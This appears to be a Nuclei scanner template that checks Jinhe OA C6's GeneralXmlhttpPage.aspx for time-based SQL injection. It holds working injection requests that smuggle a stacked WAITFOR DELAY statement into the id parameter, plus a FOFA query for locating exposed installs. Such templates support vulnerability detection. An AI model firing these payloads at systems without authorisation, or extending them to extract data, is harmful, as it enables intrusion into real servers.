id: poc-yaml-jinhe-oa-c6-getsqldata-sqli
info:
  name: 金和OA-C6-GeneralXmlhttpPage.aspx存在SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 金和OA
    fofa: app="金和网络-金和OA"

variables:
  t1: '{{rand_int(1,5)}}'
  t2: '{{to_number(t1) + 2}}'
  t3: '{{rand_int(5,9)}}'
  t4: '{{to_number(t3) + 2}}'

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:{{t1}}%27--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration >= to_number(t1)'
          - 'duration <= to_number(t2)'
          - 'trim(body) == ""'

  - raw:
      - |
        GET /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:{{t3}}%27--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration >= to_number(t3)'
          - 'duration <= to_number(t4)'
          - 'trim(body) == ""'
